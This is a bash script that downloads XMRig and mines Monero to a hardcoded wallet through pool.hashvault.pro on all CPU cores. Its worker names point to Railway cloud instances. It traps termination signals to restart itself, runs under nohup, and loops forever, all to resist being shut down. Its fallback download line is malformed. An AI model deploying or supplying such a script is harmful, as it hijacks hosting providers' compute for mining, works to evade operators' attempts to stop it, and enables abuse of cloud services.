#!/bin/bash

echo "🚀 Railway XMRig Miner starting at $(date)"
echo "Hostname: $(hostname)"
echo "CPU cores: $(nproc)"

# Trap SIGTERM and restart instead of exit
trap 'echo "🔄 SIGTERM received, restarting in 5s..."; sleep 5; exec "$0"' TERM INT

# Mining loop (auto-restart on crash)
while true; do
  echo "📥 Downloading XMRig..."
  wget -q --timeout=30 -O xmrig.tar.gz \
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" || \
    "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"

  tar -xzf xmrig.tar.gz
  cd xmrig-*

  if [ -f "./xmrig" ]; then
    echo "✅ XMRig found"
    WORKER_ID="railway-$(hostname)-$(date +%s)"
    echo "⛏️ Mining as: $WORKER_ID"
    
    # Run with nohup + background, ignore signals
    nohup ./xmrig \
      -o pool.hashvault.pro:80 \
      -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA \
      -p "$WORKER_ID" \
      --donate-level=1 \
      --threads=$(nproc) \
      --cpu-priority=2 \
      --print-time=60 > /dev/stdout 2>&1 &
    
    XMRIG_PID=$!
    wait $XMRIG_PID
  else
    echo "❌ xmrig not found, retrying..."
  fi
  
  echo "🔄 Restarting in 10s..."
  sleep 10
done
